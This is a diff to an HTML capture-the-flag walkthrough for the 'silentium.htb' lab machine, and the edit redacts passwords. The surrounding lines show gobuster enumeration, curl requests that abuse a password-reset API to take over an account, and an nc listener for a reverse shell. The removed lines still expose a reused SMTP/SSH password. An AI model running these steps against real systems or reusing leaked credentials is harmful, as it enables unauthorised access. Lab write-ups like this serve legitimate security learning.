@@ -145,7 +145,7 @@ gobuster dir -u http://silentium.htb \
   "user": {
     "email": "ben@silentium.htb",
     "tempToken": "TEMP_TOKEN_HERE",
-    "password": "NewPassword123!"
+    "password": "[REDACTED]"
   }
 }'</code></pre>
 
@@ -203,13 +203,13 @@ SENDER_EMAIL=ben@silentium.htb
 SMTP_USERNAME=test
 SMTP_USER=test
 SMTP_HOST=mailhog
-SMTP_PASSWORD=r04D!!_R4ge
+SMTP_PASSWORD=[REDACTED]
 DATABASE_PATH=/root/.flowise
 SECRETKEY_PATH=/root/.flowise
 PORT=3000</code></pre>
 
       <p>
-        The password <code>r04D!!_R4ge</code> was found in the container environment variables. 
+        The password <code>[REDACTED]</code> was found in the container environment variables.
         This password was tested against the real host user <code>ben</code> over SSH.
       </p>
 
@@ -377,7 +377,7 @@ curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
 
 curl -i -X POST http://staging.silentium.htb/api/v1/account/reset-password \
 -H "Content-Type: application/json" \
--d '{"user":{"email":"ben@silentium.htb","tempToken":"TEMP_TOKEN_HERE","password":"NewPassword123!"}}'
+-d '{"user":{"email":"ben@silentium.htb","tempToken":"TEMP_TOKEN_HERE","password":"[REDACTED]"}}'
 
 nc -lvnp 4444
 
